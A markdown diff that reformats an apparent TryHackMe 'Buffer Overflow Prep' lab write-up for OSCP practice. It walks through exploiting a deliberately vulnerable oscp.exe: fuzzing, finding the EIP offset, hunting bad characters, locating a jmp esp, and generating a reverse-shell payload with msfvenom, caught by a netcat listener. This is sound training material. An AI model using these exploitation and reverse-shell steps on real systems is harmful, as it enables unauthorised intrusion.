@@ -1,36 +1,38 @@
 ---
 sticker: lucide//code
 ---
-# Deploy VM
 
----
+# BUFFER OVERFLOW PREP
+
+## Deploy VM
+
+***
 
 This room uses a 32-bit Windows 7 VM with Immunity Debugger and Putty preinstalled. Windows Firewall and Defender have both been disabled to make exploit writing easier.
 
-You can log onto the machine using RDP with the following credentials: admin/password
+You can log onto the machine using RDP with the following credentials: admin/password
 
-I suggest using the xfreerdp command: `xfreerdp /u:admin /p:password /cert:ignore /v:10.10.200.9 /workarea /tls-seclevel:0   `
+I suggest using the xfreerdp command: `xfreerdp /u:admin /p:password /cert:ignore /v:10.10.200.9 /workarea /tls-seclevel:0`
 
 If Windows prompts you to choose a location for your network, choose the "Home" option.
 
 On your Desktop there should be a folder called "vulnerable-apps". Inside this folder are a number of binaries which are vulnerable to simple stack based buffer overflows (the type taught on the PWK/OSCP course):
 
-- The SLMail installer.
-- The brainpan binary.
-- The dostackbufferoverflowgood binary.
-- The vulnserver binary.
-- A custom written "oscp" binary which contains 10 buffer overflows, each with a different EIP offset and set of badchars.
+* The SLMail installer.
+* The brainpan binary.
+* The dostackbufferoverflowgood binary.
+* The vulnserver binary.
+* A custom written "oscp" binary which contains 10 buffer overflows, each with a different EIP offset and set of badchars.
 
-I have also written a handy guide to exploiting buffer overflows with the help of mona: [https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)[](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
+I have also written a handy guide to exploiting buffer overflows with the help of mona: [https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
 
 Please note that this room does not teach buffer overflows from scratch. It is intended to help OSCP students and also bring to their attention some features of mona which will save time in the OSCP exam.
 
-Thanks go to [@Mojodojo_101](https://twitter.com/Mojodojo_101) for helping create the custom oscp.exe binary for this room!
+Thanks go to [@Mojodojo\_101](https://twitter.com/Mojodojo_101) for helping create the custom oscp.exe binary for this room!
 
+## oscp.exe - OVERFLOW1
 
-# oscp.exe - OVERFLOW1
-
----
+***
 
 Right-click the Immunity Debugger icon on the Desktop and choose "Run as administrator".
 
@@ -46,13 +48,13 @@ Type "HELP" and press Enter. Note that there are 10 different OVERFLOW commands 
 
 Mona Configuration
 
-The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:  
+The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:
 
 ```
 !mona config -set workingfolder c:\mona\%p
 ```
 
-## Fuzzing
+### Fuzzing
 
 Create a file on your Kali box called fuzzer.py with the following contents:
 
@@ -89,7 +91,7 @@ Run the fuzzer.py script using python: `python3 fuzzer.py`
 
 The fuzzer will send increasingly long strings comprised of As. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent.
 
-## Crash Replication & Controlling EIP
+### Crash Replication & Controlling EIP
 
 ﻿Create another file on your Kali box called exploit.py with the following contents:
 
@@ -122,7 +124,7 @@ except:
 
 Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server (change the `-l` value to this):
 
-`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600`  
+`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600`
 
 If you are using the AttackBox, use the following path to `pattern_create.rb` instead (also ensure to change the `-l` value):
 
@@ -148,11 +150,11 @@ Update your exploit.py script and set the offset variable to this value (was pre
 
 Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242).
 
-## Finding Bad Characters
+### Finding Bad Characters
 
 ﻿Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).
 
-`!mona bytearray -b "\x00"   `
+`!mona bytearray -b "\x00"`
 
 Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from `\x0`1 to `\xff`:
 
@@ -176,25 +178,25 @@ The first badchar in the list should be the null byte (\x00) since we already re
 
 Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.
 
-## Finding a Jump Point  
+### Finding a Jump Point
 
-With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):  
+With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):
 
 `!mona jmp -r esp -cpb "\x00"`
 
 This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).
 
-Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.  
+Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.
 
-## Generate Payload
+### Generate Payload
 
-Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):  
+Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):
 
-`msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c   `
+`msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c`
 
 Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:
 
-## Prepend NOPs
+### Prepend NOPs
 
 Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:
 
@@ -202,7 +204,7 @@ Since an encoder was likely used to generate the payload, you will need some spa
 padding = "\x90" * 16
 ```
 
-## Exploit!
+### Exploit!
 
 With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell.
 
@@ -210,28 +212,27 @@ Start a netcat listener on your Kali box using the LPORT you specified in the ms
 
 Restart oscp.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!
 
+### Practical
 
-## Practical
-
-----
+***
 
 First, we need to run `Immunity Debugger` as admin:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529120641.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529120641.png)
 
 Once we run it as admin we need to open `oscp.exe` file located at the desktop of the administrator user:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529120730.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529120730.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529120742.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529120742.png)
 
 As seen, the binary is in a paused state, we need to click the `red play button` to start it:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529120831.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529120831.png)
 
 The state has now changed to running, we can use netcat to verify it is listening:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529120948.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529120948.png)
 
 Everything's right for now, let's proceed, what we need to do now is configure mona, in Immunity’s command bar (bottom), run:
 
@@ -239,9 +240,9 @@ Everything's right for now, let's proceed, what we need to do now is configure m
 !mona config -set workingfolder c:\mona\%p
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529121058.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529121058.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529121115.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529121115.png)
 
 Now, on our linux machine we need to create a file named `fuzzer.py` with this contents:
 
@@ -338,7 +339,7 @@ s.close()
 
 Before we use the script, we need to restart `oscp.exe` on immunity debugger, simply open it again as before and press the red play button:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529122103.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529122103.png)
 
 Now, use the script:
 
@@ -356,7 +357,7 @@ If we did everything correctly, the oscp.exe file crashes, we now need to use mo
 
 Now if we take a closer look to the log panel we get in mona, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529122501.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529122501.png)
 
 As seen, I got my offset:
 
@@ -396,7 +397,7 @@ s.close()
 
 We need to restart `oscp.exe` again and run it:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529123058.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529123058.png)
 
 As seen, we got `Access Violation when executing [42424242]`, this means everything's going right by now, now, we need to use mona again to generate the base bytearray:
 
@@ -404,8 +405,7 @@ As seen, we got `Access Violation when executing [42424242]`, this means everyth
 !mona bytearray -b "\x00"
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529123802.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529123802.png)
 
 As seen, it got saved as `bytearray.bin`, we now need to create a bad char string on another python script:
 
@@ -446,10 +446,9 @@ s.send(bytes(buffer + "\r\n", "latin-1"))
 s.close()
 ```
 
-
 Now, restart the file again and use the script, the server will crash again and we need to look in the right side of immunity for the `ESP address`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529124609.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529124609.png)
 
 There we go, our address is:
 
@@ -463,7 +462,7 @@ Now, we can use mona;
 !mona compare -f C:\mona\oscp\bytearray.bin -a 0x0018F430
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529124830.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529124830.png)
 
 Mona is telling us `\x01` is mangled in memory, we need to regenerate the bytearray excluding `\x00` and `\x01`:
 
@@ -502,7 +501,7 @@ Restart and compare again, we will get a new `esp` address, we need to check it 
 !mona compare -f C:\mona\oscp\bytearray.bin -a 0x01A4FA30
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529125231.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529125231.png)
 
 Got this, need to do the process all over again:
 
@@ -538,7 +537,7 @@ s.close()
 !mona compare -f C:\mona\oscp\bytearray.bin -a 0x01CBFA30
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529125741.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529125741.png)
 
 Finally, we got:
 
@@ -552,7 +551,7 @@ Means that the bad char hunting is over, we now need to proceed with finding the
 !mona jmp -r esp -cpb "\x00\x01\x02\x07\x08\x20\x2e\x2f\xa0\xa1"
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529125932.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529125932.png)
 
 As seen, we get some jmp esp gadgets, let's choose the first one:
 
@@ -637,78 +636,70 @@ print("[+] Done. Check your listener for a shell!")
 
 We need to restart it and send the exploit:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529131124.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529131124.png)
 
 If we got our listener ready, we will receive the connection:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529131143.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529131143.png)
 
 We can now answer the questions:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529131224.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529131224.png)
 
 From now on, since the process is pretty much the same, you guys can practice by trying to get a reverse shell in every single `OVERFLOW`. If you got any problem, check the answers below.
 
-# oscp.exe - OVERFLOW2
+## oscp.exe - OVERFLOW2
 
----
+***
 
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529132544.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529132544.png)
+## oscp.exe - OVERFLOW3
 
+***
 
-# oscp.exe - OVERFLOW3
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529132558.png)
 
----
+## oscp.exe - OVERFLOW4
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529132558.png)
+***
 
-# oscp.exe - OVERFLOW4
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529132609.png)
 
----
+## oscp.exe - OVERFLOW5
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529132609.png)
+***
 
-# oscp.exe - OVERFLOW5
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529132623.png)
 
----
+## oscp.exe - OVERFLOW6
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529132623.png)
+***
 
-# oscp.exe - OVERFLOW6
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529132634.png)
 
----
+## oscp.exe - OVERFLOW7
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529132634.png)
+***
 
-# oscp.exe - OVERFLOW7
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529132645.png)
 
----
+## oscp.exe - OVERFLOW8
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529132645.png)
+***
 
-# oscp.exe - OVERFLOW8
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529132704.png)
 
----
+## oscp.exe - OVERFLOW9
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529132704.png)
+***
 
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529132725.png)
 
-# oscp.exe - OVERFLOW9
+## oscp.exe - OVERFLOW10
 
----
+***
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529132725.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529132736.png)
 
-# oscp.exe - OVERFLOW10
-
----
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529132736.png)
-
-
-
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250529132524.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250529132524.png)
